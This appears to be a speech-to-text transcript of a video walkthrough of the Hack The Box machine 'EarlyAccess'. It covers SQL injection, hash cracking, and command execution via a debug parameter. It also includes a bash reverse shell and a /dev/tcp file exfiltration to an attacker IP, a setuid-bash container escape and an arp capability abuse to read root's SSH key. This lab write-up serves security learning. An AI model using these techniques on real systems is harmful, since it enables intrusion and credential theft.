we'll see what happens oh it gave me two well this is actually able to put multiple things on a table i guess because we're doing the sql injection inside of a table i'm not limited to one row because this php code is doing a select username score time from table name where username is equal to your user and then going through each row and adding it i'm used to having to do like a group concat to put everything on one line but in this case i don't which is pretty cool so if we did that it puts it on one line the box i created called union if you want to learn more about this but since i don't have to and it's prettier just going like this i'm going to leave it like this so we know the database uh the name we want is db because this one is the default database so now we can instead of selecting schema name we go over to the columns table what is it there we go and i want table name and column name where the table schema is database if we don't add the word as database we're going to get way too many rows but i want column name uh probably table name first table name column name from information schema dot columns where we won't do the where first so you can see what happens and i may have to concat these two let's see actually i can probably put um leave table name here and we can probably put the column name and score and score is currently one so if i refresh this we probably error because we're trying to put two things in one column but if i move this to one save it now we have the table and different columns and you can see this is all information schema thankfully the database came first so a db database came first or whatever it's called however if we wanted to only get the ones we want we can say where um table schema is equal to db and now we don't have all those information schema rows so now we have failed logins scoreboard and users i probably just want to get the user's name email and password so i'm going to change this to name was it name user password name email password email password from information schema and we don't need to do this anymore we can just say from db.users db.users right yes refresh the page and we kind of put it in a bad order uh but we got in reverse so emails usernames passwords and then our password was password so i'm going to do a real quick echo dash n wc-c it's 41 characters so chances are this is a sha-1 sum uh echo what do sha one sum probably doesn't have that line break so dash n and we see our hash matches up so now we know everyone else's hash so let's see let's just copy and paste these in v hashes uh i'm gonna do this a better way so let's see let's go to early access i'm going to group concat we can do name or we'll do email and password i would do name name colon password from db users save error because i need to balance out the lines see put it in quotes unknown column single quotes there we go so the reason why i did this is so i want to copy and paste each thing so v hashes.txt paste it in we can separate on a comma there we go so now we just have all the names and hashes so with this we could go over to hashcat or john um i think i turn my box off right now so yeah i can't go into hash cat i'm just going to try john real quick and to do john i don't know if it wants um his name colin hash so i'm going to awk dash f print to hashes.txt 2 to crack john to crack dash dash word list is equal to user share word list rocky.text i have that here and we immediately cracked the password which was game over now the reason why i put it in this format is because hashcat if i specify the dash dash user flag would ignore all this and i could easily see where this password cracked to but i don't know if john does that or how to do it with john so what if i just gave john let's see john hashes.txt is there like a dash dash user flag username i don't know how to do it in john but i know in hashcat there's that user flag but what we want to do is echo dash n game over sha one sum to see whose password this is six one eight grep six one eight hashes.txt and that is admin so now we have credentials for admin and if you remember there was this dev.earlyaccess.htb i believe let's see if we log in i don't think that is it let's see i could have swore there was one that we saw earlier that i closed the tab uh cat etsy hosts i wonder if i need to be logged in with admin let's see dev early access early access development here we go what was that before slash login i'm not exactly sure what the difference here is maybe it's the same but here we are if i put the password of game over we get into the developer admin panel and there's a hashing tools and a file tools if i look at file tools we see ui is not implemented yet if we go over the hashing tool we can change the hash so put this in click cache and we get an md5 hash guess if we do sha1 sums we get those we can also verify a hash but i'm going to look at exactly how this works let's do test hash it look at the request we can see this is a php app and the hash function's using md5 and we're just doing the password of test and it looks like it redirects us and in php md5 is an actual thing like a function so if i just md5 test it works it's not like md5 sum or anything like that so my first thought is to try to just put a different thing in like hash function call system and then password of id and then we for this and it says only md5 and shot one some are supported so there's nothing really here yet so we can go over to file tools and we just see ui is not implemented so for this we probably want to try to fuzz the um parameters right and if i'm looking at this request we have hash.php so if i would guess maybe there's a file.php and we get an error message specify file if i put something that doesn't exist we get a 404. so i'm going to guess there is a slash actions slash file.php that has a parameter do something so let's try using w fuzz so w fuzz dash u um let's put this whole url in we probably yeah we already got actions i think dash k to ignore s so i found out the issue remember like five minutes ago i did dev.early access and i was like this doesn't look right because i didn't have the admin well the dev site isn't https so we don't need that dash k so for this i'm going to [Music] first clear this so we can type on both we're going to fuzz the parameter and i'm going to put etsy passwd because i assume that exists and then dash w for word list and that's where i'm going to go into opt set list look at fuzzing fine dot grab param maybe it's under discovery i'm going to do this one so opt set list discovery web content parameter names we're just going to start running this and then we're going to hide words of three and see if we get anything here how many lines is that wc-l this is a big word list looks like 2589 it tells me so right now we're just waiting for this to finish and if it does come across a valid parameter we should find out and there we go at line 1 316 there's file path and it returned 89 characters so i'm going to go here we can probably just change this let's see get rid of all this it probably works as both a get or a post request whenever i do fuzzing i always do my commands twice one to test to get one to test a post but in this case we know file path works so if i try to get foul etsy past wd we say for security reasons reading outside this directory is prohibited so we can't read outside of either the web directory or [Music] maybe this actions i don't know exactly what that limit is let's try dot dot slash index.php and we can't even do that so it's probably limited to things in actions or maybe in the root i don't know yet so i'm going to do php colon slash filter then convert dot base64 dash n code resource is equal to try file.php uh we don't have anything i'm going to try action file.php and we can't open the file let's try hash.php there we go we got the source code to this i'm not sure why the other one wasn't working maybe it was some like word where he can't include herself but now we do have the source code for hash.php so let's take a look at that v dot php i should make this base64 i can do basic four dash d hash.php there we go so we can see the hash function and we can see we are correct um the way this is doing is taking user parameter and allowing us to execute the php code so md5 password or if we put system password here it would work but there is something that prevents us and it looks like if we enable debug mode we can do custom hashes and we see if request hash function is not md5 sha-1 or debug is not set then throw this so we did system and system does not equal md5 or sha-1 and we didn't have this debug header so it just threw up on us however if we had put debug as a parameter this suddenly works so let's go and try this again so let's go to hashing i'm just going to do id there make sure we intercept hash and hash functions gonna be system and debug is equal to please subscribe doesn't actually have to do anything it just has to exist and now we have that so let's now get a reverse shell to this box so i'm going to first let's see we got two things up i'm trying to think if i want to [Music] um do a bunch of special things to avoid bad characters i don't have to but it's always good practice so bash dash i dev tcp 10 10 14 8 9 000 1 0 and 1 that sounds good well base 64 zero if i want to do echo dash n as well and then let's see we have to get rid of that plus and those equal signs so there's the plus gone and then that looks good so i'm just avoiding any like bad html character or something and now if i do echo dash n base64-d bash nc lvmp 9001 we get a connection so we know this works let's go back here and we will intercept this change this to system and debug equals something and the password is going to be echo dash n then we'll base64-d bash and when we hit forward we'll hope for the best if we go back here we have a web shell and keep in mind this is probably going to be in some type of docker so if config we don't even have any of those commands so we're definitely in a docker no ip and no wave config do we have python even well we're running a python web server right no this is php python3 okay we have python3 c import pty pty dot spawn pin bash shoot python 3 c input pty pty dot spawn pen bash control z stty raw minus echo fg and enter twice and now we're in a good shell so let's do this so we can clear the screen and now we have to figure out exactly what we want to do in this docker container we already kind of had the credentials in the database we can see what this uses to talk to the database potentially let's see dev looking for like a config.php let's just look at all the php files probably includes config.php uh no less well cat so we have the database at database the user dev and password of dev so that doesn't really help us too much we can try looking at game so if i look at game find dot grep php same place so includes config.php and this time instead of devdev it's game game so the other thing we can do is look at home and we see there is a dub dub dub admin and we're dub dub dub data so if i go into this we see there's a w get rrc file but there's nothing we can do to read it so somehow we have to get to this dub dub dub dash admin so i'm going to try s u dub dub dub adm all right i forgot a dash try password dev okay i'm gonna try the password game and then the other password we know that could be is potentially game over so try game over and we get in as dub dub dub admin now there's probably a reason why this wget rc file is here we have user api password of secure api pw so i'm going to try ssh in real quick so ssh api at 10 10 11 110 probably have to accept oh we already have that key so let's try pasting in this password see if we get in and we don't so there's probably somewhere we can use this api key wget rc is just the file wget reads before making a request so i don't see any like w get history on this box the bash history is pointed to dev null so i'm going to download the static binary of nmap so we can end map inside this docker container so i'm going to google static binaries github i probably already have it on my box somewhere but always good showing where to get these binaries from so i'm in this repository and let's see we want nmap so probably go to the nmap folder and that's build we don't want build i think binaries linux 64-bit let's just make sure you name a amd 64. and nmap so this is probably what we want so download it we can move and map into dub dub dub three dash m start up a web server and let's go to temp curl 10 10 14 8 and map we need 2.8 000 and map dash oh and map so now we're downloading this static binary and we should be able to just execute it and run it we can so we have to figure out what ip range to work against um i think it's like 172 18 0 is a good one to try we saw that on the like my sequel forget where um moy dead hearst name i think or who am i on the sql injection we can also cat like etsy host and we have 172 18 here so let's scan this slash 24. so nmap 172 18 0 dot zero slash twenty four uh we have to do dot slash i'm also going to let's see what flags i want dash n so we don't do dns dash v so we show things as we find it and we have a few i think we can do like dash dash online or up does that work maybe dash dash up if not we'll just read it to files yeah let's just drag the files so make dirt nmap let's do output and then we can do oa for output all formats put an nmap or put it in output and we'll call this dockers we could have also like set up a tunnel but using nmap through tunnels is ill-advised oh man there's a lot of php sessions there just look at output and we can say dockers.nmap and let's see there's five hosts up so we can probably grab v host down see what are up we have 102 with 80 and 443 then 101 is up but no ports 100 is up with my sequel that's probably the db and then one is up with 2280 and 443 chances are this is going to be the host um 102 could be ourselves so let's see if we curl 172 18 0 102 what do we get it's going to early access hdb i think that may be the docker container we are in um paying web server will this do it oh we don't have ping girl web server just go i'm trying to think of a good way to resolve my hostname because we don't have ip we don't have ifconfig we have python3 so python3 dash c import os let's see python3 print ip address c host ip so we want socket not okay so we need to run both of these so python3 or we can just do python3 and drop into the dripper we can let's do import socket we got hers name right first name is web server then let's get our ip address host ip and there's probably a better way to go around this so yes we are 102 so there's no point in scanning 102 100 probably the database i'm kind of curious at 101 real quick so let's do dot slash nmap v 101 do all ports and we do have a port 5000 so curl 172 18 0 101 5000 and we have the game key verification api so we can verify game keys also we can do a check db so if i do check underscore db we get invalid auth so if i do a w get against that because we have that w get rrc file we download it and we get output um we could probably just let's see cat dot wget rc i bet if we do curl and then what is it api paste the password ah this also works let's see curl api paste this if not there's probably some flags we can do for http auth yeah we can do it this way as well so this gives us a big json blob so i'm just going to copy this whole thing and then we'll bring it back to our computer and just do a jq against it so we have a way to help put this in a pretty format so output paste this cat output jq dot and now we can view this so this is a docker thing entry point we have more my sql query creds drew and then this password so with all these passwords we're just trying to test them with ssh to see if we ever get onto the host so let's try drill put this in and we have access but we shouldn't stop there we should just read this whole file to see if there's anything else it's doing a ping doesn't look like there's anything else in the script so i'm going to kill this and we will begin enumerating this box so we can kill this pain ipaddr we can list all the dockers here but let's see what do we want to do ls slash home drew in game admin probably look at lin p's so let's do cp well let's go into www cp opt privilege escalation script awesome suite let's just do a get pulled real quick because it's been a while should update this doesn't take too long and we can run lin pease uh what builder find out grep sh so it looks like lin peas may have converted to a python script see we got this builder oh it looks like um it's now for customization they're not giving the whole script it looks like that python script may build let's see what's under images builder python3 if we just run this well i regret doing that get pull now uh let's see github lend p's there's gotta be something easy about this go to his github so it looks like it changed so we're doing this live i guess git clone this let's go in here and let's see how do we build this quick start latest version limpese.sh this is what i want sweet move downloads linps.sh into htb uh this is early access www so looks like you don't just clone the repo you just download it off the website now simple enough python three dash c um dash m http server there we go curl 10 10 14 8 8 000 limps sh type it over to bash and i'm going to give this a few minutes to run and then we can look over the results okay let's go over these results so curl 10 10 14. let's go see curl 1010 not that here we go and let's see the system information not too interesting and d message we detect it's a vm of course processes i think that's new normally lists are all processes this is just like cleaning it up i guess hence cleaned processes that's cool looking for unusual crons don't see anything socket files see sockets listening i don't know exactly what that's for i guess i should read the hack tricks on it a bunch of interfaces because we have all those dockers what ports we're listening on 8443 is a bit weird we may want to look at that the notes okay this is where we were drew pseudotokens users we do have this game admin user who's also a member of adm logins  file php extensions gpasswd [Music] we have a ssh key that may just be used to get onto the box or it may be something special actually we can see the idr say public is game tester so that ssh key looks to be something unique we have known host but it is this new format of known host which prevents us from just seeing the ip addresses which is annoying tmux a bunch of stuff here looking at unique docker files nothing interesting log files capabilities so arp is different i'm not using up here let's see lsla five sum if we virus total this it should be something we've seen before to make sure this isn't a weird binary generally it's the first thing i do whenever i look at um like set uid set gid capability files i don't know as i send in a hash and see when it was for a scene so this is probably last seen right if we go to details first mission 2020 october 3rd so around this time so chances are this is a legit art binary um however let's see user s pen root oh i'm looking at my box we should look at this box of course the box art binary on my box would be legitimate we have this op docker entry point we got mail and this is the logs that we ended with so first thing i guess we should check is our user spin arp september 2018 that is an old one let's check md md5 sum wait md5 sum yep unable to read it so only adm user can execute it along with root or adm group i should say so we can't execute that that is interesting oh port 8443 we can go etsy as an engine x using this site's available default eight four four three this is just going to var dub dub dub html what's 443 going grab 443 default is there apache also i'm not exactly sure where 443 is going maybe docker has it mounted and it's going inside of a docker container i guess that may make sense um [Music] we have ssh key we have mail so we can just type i thought we could type mail let's just go cd verse bull mail cat drew we can see his mail it looks like it's sent from the game admin who was a adm user so we could probably do something with arp because that is uniquely configured so telling us thank you for your time testing the game server will automatically restart if it's crashed if you find problems let us know so what we have to do is find the game server i guess and we do have that ssh key so if icat idrsa.pub we have game tester at game server can i just ping game server doesn't look like i can so we have to find where this is do we have nmap we can download nmap so let's do curl 10 10 14 8 1000 and map o and map to download it and we will ip addr crap 172 so we can try scanning 172 1901 that's a different um network bridge we already scanned 18 when we're in the docker so let's scan the other one at 19 because we didn't see that before so chmod plus x add map and then nmap let's make their output and map dash o a output dash n because we don't care about names 172 19 0 1 24. oh we should have done.0 24 but it looks like it worked we have 1901 which is ourself and 1904 so if i sh 172 1904 ask us for the password but again let's go into that id rsa key and try sshing as game tester it's going to use the id rsa key that we already have and lets us log right in so if i do sslntp we do have it listening on port 9999 i'm going to do squiggly c which is going to go into ssh config and i'm going to forward this port back to us so we're back to this so i'm in what port 172 1904 so squiggly c dash l i want to listen on 9999 and this is on my host i'm going to forward it through ssh to 1904 9999 so now if i go here i do localhost we get all the way up here into this box and we can play a game so that male said if we can somehow crash this it will automatically restart so if it restarts we should find um how we can try to get code executed on this i'm going to cut the entry point because entry point is where docker runs to execute first and we have 4 ep i'm guessing that's i don't know for entry point in this folder and it's going to try to execute it and then we're just going to tail devnet so there's probably some type of crown running that's hitting this port and then if the game doesn't load it restarts this docker and this entry point we can potentially write to because if we went back to our thing we have this opt docker entry point that we saw on ln ps and that's running node server so that's how this is getting started so i'm going to try let's do v exact exec.sh ben bash and let's see chmod four seven five five bend bash i'm gonna ssh there real quick ls docker entry point it's gone one of this is just copied at the start but i wanted to make sure bash was there because sometimes it could be like in user bin and our file's gone so we just want to keep writing a file there i guess ssh uh drew's password was oh what was drew's password uh it doesn't matter because i think we can just write a key cat idrsa.pub it was that long password i remember now um again if i download this key we should be able to just ssh as him as long as this key correlates to that v drew paste chmod 600 drew sh-i drew drew at 10 10 11 110. please get in we don't sage key gen f drew overwrite cat drew.pub and we'll copy this key over to authorize keys i guess i could have renamed idrsa.pub to authorize keys and then done it that way chmod sh-i there we go so opt docker entry point and we want to create some type of forever loop just writing to this file so temp my nmap didn't get deleted so i'm just going to move it there chmod four seven five five bend bash it's mod plus x exec.sh and let's see i'm going to copy this v test.sh while true do does this work echo test done see bash forever loop lowercase t there we go so now i can cp exec.sh to that directory now if i run this we go up docker entry point now it's going to keep running by ssh here we now see it so what's left is crashing this game so if i cat node server see it's going to do server.js then opt yarn find.grep server.js should pipe error messages out user app server or user source app cat server.js this looks like it we can do them let's see catserver.jsnc1010148 pipe it over to 9001 and see lvmp 9001 out we don't have nc let's see can i just dev tcp 10 10 14 8 91 there we go cut out there we go now i can vim it if i move out to server.js we have syntax highlighting okay so we're listening on port 9999 some random player see so while rounds does not equal zero what if we just have a super long game or a game that doesn't increment let's try something let's go over to where's localhost 9001 if i do round set to negative one start game let's see let's proxy this one two three it may not intercept because i'm not sure i'm intercepting localhost 100 start game so we can either now do infinite number of games potentially like this and give it a really high number and it just gets internal server error did that crash it let's see that's not it this is what i want but if i set rounds to so maybe i just did like an integer overflow like this number is too high and it just didn't work so yeah there's probably some limit here for how high of a number i can use if i do 100 there we go so i'm kept at 100 but what if i do negative 1 is it just going to infinitely loop because the round is never going to hit negative one no matter how much high it goes and if it does the game gets hung and then it should try to auto clean itself and when it does we'll see bash set to executable so there we go a daca died because it detected it was crashed it starts up a new one see is it still zero four maybe it's a different ip address let's try the next one up now we're out there let's try zero four something's happening it's thinking about going can i ping it ping 172 1904 let's do that nmap again c temp and map zero three okay let's see if we can ssh there yes ls slash so this looks like it may be the same thing lsla ben bash we see this set uid bit on bash so if i do bash dash p i am now effective id of root if i do id here we see that's not there so we have now successfully prevest in this docker container and i can now potentially get the game admins password so if we grab this let's go back to our machine v hashes paste this john hashes word list user share word list rockyou.txt so try cracking this it is sha 512 crypt so it can take a while but we have game adm's password is game master so let's go back here we can probably exit this docking container we can kill her forever loop because we've already popped that container and cat etsy passwd su game adm put in game master and now we are the game adm user and the key thing is we're member of adm so if you remember that is where user aspen arp exists and we can now execute this command where we couldn't before so if i try to user s bin arp am mission denied but we can because the file is executable by members of the adm group and that is not common this also has a weird capability on it so let's see if it's in gtfo bins so let's disable the proxy google see what we can do with arp looks like we can read files so v dash f and then the file up dash v dash f root root.text format error on ether file let's see oh it's right in front of my eyes right here telling us the line so that is the flag if we also do root dot ssh id rsa we can get the private key so we probably just have to do some awkward formatting here so copy this key let's try this v root paste so we only want lines that begin in that bracket so i'm going to do percent s arp d we'll add that i thought i was deleting those lines paste that again grab v colon on root and now let's do percent s i'm going to escape those see maybe i don't want to escape it okay percent s begins with a space and i think i've restored this key chmod 600t we can move t over root sh-i root root at 10 10 11 110 and we are now root on this box so hope you guys enjoyed that take care and i will see you all next week